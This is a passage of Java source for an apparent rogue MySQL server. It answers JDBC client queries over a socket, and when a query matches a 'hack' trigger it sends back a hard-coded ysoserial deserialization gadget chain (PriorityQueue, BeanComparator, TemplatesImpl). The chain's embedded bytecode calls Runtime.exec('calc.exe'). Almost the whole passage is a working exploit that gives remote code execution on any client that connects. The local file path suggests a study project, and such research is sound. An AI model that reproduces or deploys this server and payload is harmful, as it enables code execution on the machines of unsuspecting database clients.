                } else if (content.contains(hashmap.get(6))) {
                    sendData("ok", socket);
                } else if (content.contains(hashmap.get(7))) {
                    sendData("ok", socket);
                } else if (content.contains(hashmap.get(5))) {
                    sendData("hack", socket);
                } else if (content.contains(hashmap.get(4))) {
                    sendData("sessionAuto", socket);
                } else if (content.contains(hashmap.get(3))) {
                    sendData("warning", socket);
                }
            }
        }
    }
    private String receiveData(Socket socket) throws IOException {
        BufferedInputStream bis = new 
BufferedInputStream(socket.getInputStream());
        DataInputStream dis = new DataInputStream(bis);
        try {
            byte[] bytes = new byte[1]; // 一次读取一个byte
            StringBuilder ret = new StringBuilder();
            StringBuilder hex= new StringBuilder();
            while (dis.read(bytes) != -1) {
                //hex.append(bytesToHex(bytes));
                ret.append(new String(bytes, StandardCharsets.UTF_8));
                if (dis.available() == 0) { //一个请求
                    System.out.println(ret);
                    break;
                }
            }
            return ret.toString().toLowerCase();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    private void sendData(String type, Socket socket) throws IOException {
        DataOutputStream dataOutputStream = new 
DataOutputStream(socket.getOutputStream());
        System.out.println(type);
        switch (type) {
            case "ok":
                dataOutputStream.write(hexTobytes(response_ok));
                dataOutputStream.flush();
                break;
            case "greating":
                dataOutputStream.write(hexTobytes(greating_data));
                dataOutputStream.flush();
                break;
            case "sessionAuto":
                dataOutputStream.write(hexTobytes(sessionAuto));
                dataOutputStream.flush();
                break;
            case "warning":
                dataOutputStream.write(hexTobytes(warning));
                dataOutputStream.flush();
                break;
            case "hack":
                String data = "0100000102";
                data += 
"1a000002036465660001630163016301630c3f00ffff0000fc9000000000";
                data += 
"1a000003036465660001630163016301630c3f00ffff0000fc9000000000";
                String payload = getPayload();
                String dataLength = payloadLength(payload+"00");
                //data += dataLength + "04";
                //data += payload;
                //data += "0500003dfe00000200";
                data 
+="d50a0004fbfcd10aaced0005737200176a6176612e7574696c2e5072696f72697479517565756
594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612
f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6
d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a44802000
24c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c6
16e672f537472696e673b78707372003f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c6
56374696f6e732e636f6d70617261746f72732e436f6d70617261626c65436f6d70617261746f72f
bf49925b86eb13702000078707400106f757470757450726f7065727469657377040000000373720
03a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c746
32e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e7
44e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035
b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6
571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f5
0726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787
000000002757200025b42acf317f8060854e002000078700000069ecafebabe0000003400390a000
3002207003707002507002601001073657269616c56657273696f6e5549440100014a01000d436f6
e7374616e7456616c756505ad2093f391ddef3e0100063c696e69743e010003282956010004436f6
46501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6
501000474686973010013537475625472616e736c65745061796c6f616401000c496e6e6572436c6
1737365730100354c79736f73657269616c2f7061796c6f6164732f7574696c2f476164676574732
4537475625472616e736c65745061796c6f61643b0100097472616e73666f726d010072284c636f6
d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4
d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f736572696
16c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7
401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f787
36c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616
368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6
e48616e646c65723b01000a457863657074696f6e730700270100a6284c636f6d2f73756e2f6f726
72f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f737
56e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d4178697349746
57261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f7
3657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657
261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2
f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f737
56e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657
269616c697a6174696f6e48616e646c65723b01000a536f7572636546696c6501000c47616467657
4732e6a6176610c000a000b07002801003379736f73657269616c2f7061796c6f6164732f7574696
c2f4761646765747324537475625472616e736c65745061796c6f6164010040636f6d2f73756e2f6
f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f4
1627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c65010
039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c746
32f5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061796c6f6164732
f7574696c2f476164676574730100083c636c696e69743e0100116a6176612f6c616e672f52756e7
4696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e746
96d653b0c002c002d0a002b002e01000863616c632e65786508003001000465786563010027284c6
a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c00320
0330a002b003401000d537461636b4d61705461626c6501001e79736f73657269616c2f50776e657
23836353936353638353031343530300100204c79736f73657269616c2f50776e657238363539363
53638353031343530303b002100020003000100040001001a0005000600010007000000020008000
40001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010
000002f000e0000000c000100000005000f003800000001001300140002000c0000003f000000030
0000001b100000002000d00000006000100000034000e00000020000300000001000f00380000000
00001001500160001000000010017001800020019000000040001001a00010013001b0002000c000
000490000000400000001b100000002000d00000006000100000038000e0000002a0004000000010
00f003800000000000100150016000100000001001c001d000200000001001e001f0003001900000
0040001001a00080029000b0001000c00000024000300020000000fa70003014cb8002f1231b6003
557b1000000010036000000030001030002002000000002002100110000000a00010002002300100
0097571007e0010000001d4cafebabe00000034001b0a00030015070017070018070019010010736
57269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3
c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d626572546
1626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000
c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2
f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a61766
10c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f476164676
5747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f5365726
9616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f476164676
57473002100020003000100040001001a000500060001000700000002000800010001000a000b000
1000c0000002f00010001000000052ab70001b100000002000d0000000600010000003c000e00000
00c000100000005000f001200000002001300000002001400110000000a000100020016001000097
074000450776e72707701007871007e000d7807000005fe000022000100";
                dataOutputStream.write(hexTobytes(data));
                dataOutputStream.flush();
                break;
        }
    }
    private String getPayload() throws IOException {
        File file = new File("C:\\Users\\Administrator\\Documents\\工作学习相关\\学
习\\MySQL_Fake_Server\\1.txt");
        FileInputStream fileInputStream = new FileInputStream(file);
        byte[] bytes = new byte[(int) file.length()];
        fileInputStream.read(bytes);
        return bytesToHex(bytes);
    }
    private byte[] hexTobytes(String hex) {
        if (hex.length() < 1) {
            return null;
        } else {
            byte[] result = new byte[hex.length() / 2];
            int j = 0;
            for (int i = 0; i < hex.length(); i += 2) {
                result[j++] = (byte) Integer.parseInt(hex.substring(i, i + 2), 
16);
            }
            return result;
        }
    }
    public String bytesToHex(byte[] bytes) {
        StringBuffer stringBuffer = new StringBuffer();
        for (int i = 0; i < bytes.length; i++) {
            String s = Integer.toHexString(bytes[i] & 0xFF);
            if (s.length() < 2) {
                s = "0" + s;
            }
            stringBuffer.append(s.toLowerCase());
        }
        return stringBuffer.toString();
    }
    public String payloadLength(String payload) {
        String hexStr = Integer.toHexString(payload.length() / 2);
        int length = hexStr.length();
        if (length % 6 != 0) {
            for (int i = 0; i < 6 - length; i++) {
                hexStr = "0" + hexStr;
            }
        }
        System.out.println("payload长度：" + hexStr);
        return hexStr;
    }
}